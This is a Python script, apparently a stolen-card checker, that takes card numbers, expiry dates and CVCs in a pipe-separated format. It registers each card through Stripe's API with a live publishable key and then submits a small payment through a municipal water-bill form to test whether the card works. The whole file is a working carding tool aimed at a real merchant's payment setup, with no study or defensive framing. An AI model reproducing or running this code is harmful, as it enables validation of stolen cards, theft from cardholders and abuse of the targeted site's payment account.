import requests,re
import random
def Tele(ccx):
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	
	random_amount1 = random.randint(1, 4)
	random_amount2 = random.randint(1, 99)
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2Fa10732936b%3B+stripe-js-v3%2Fa10732936b%3B+card-element&referrer=https%3A%2F%2Fphillipsburgoh.gov&time_on_page=26450&client_attribution_metadata[client_session_id]=8018fecc-d3f5-4677-b7ef-0584067cff33&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51SCkbd2QFi1R5OccRFBjcVC35jII1s2C2aYbWzuJp5aQreP1hpaa3ZCwNdsANY1YQ9hzF5AUtsD15g8r1Y2nr5DN002qac1owB'
	
	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = response.json()['id']
	
	cookies = {
	    '_ga_3DSWE1FTZP': 'GS2.1.s1769730633$o1$g0$t1769730633$j60$l0$h0',
	    '_ga': 'GA1.1.1180704883.1769730634',
	    '__stripe_mid': 'c9ee2967-bfec-4765-a433-9cf71448f56b1999d3',
	    '__stripe_sid': '77ef95ae-545c-4388-8c8d-8a5a3bc8d14f47d1ab',
	}
	
	headers = {
	    'authority': 'phillipsburgoh.gov',
	    'accept': '*/*',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': '_ga_3DSWE1FTZP=GS2.1.s1769730633$o1$g0$t1769730633$j60$l0$h0; _ga=GA1.1.1180704883.1769730634; __stripe_mid=c9ee2967-bfec-4765-a433-9cf71448f56b1999d3; __stripe_sid=77ef95ae-545c-4388-8c8d-8a5a3bc8d14f47d1ab',
	    'origin': 'https://phillipsburgoh.gov',
	    'referer': 'https://phillipsburgoh.gov/water-bill/',
	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    't': '1769730656959',
	}
	
	data = {
	    'data': f'__fluent_form_embded_post_id=3739&_fluentform_10_fluentformnonce=8604135121&_wp_http_referer=%2Fwater-bill%2F&names%5Bfirst_name%5D=&names%5Blast_name%5D=&address_1%5Baddress_line_1%5D=&address_1%5Baddress_line_2%5D=&address_1%5Bcity%5D=&address_1%5Bstate%5D=&address_1%5Bzip%5D=&input_text=&numeric_field=&phone=&email=&custom-payment-amount=0.50&payment_method=stripe&__stripe_payment_method_id={pm}',
	    'action': 'fluentform_submit',
	    'form_id': '10',
	}
	
	response = requests.post(
	    'https://phillipsburgoh.gov/wp-admin/admin-ajax.php',
	    params=params,
	    #cookies=cookies,
	    headers=headers,
	    data=data,
	)
	
	return response.text
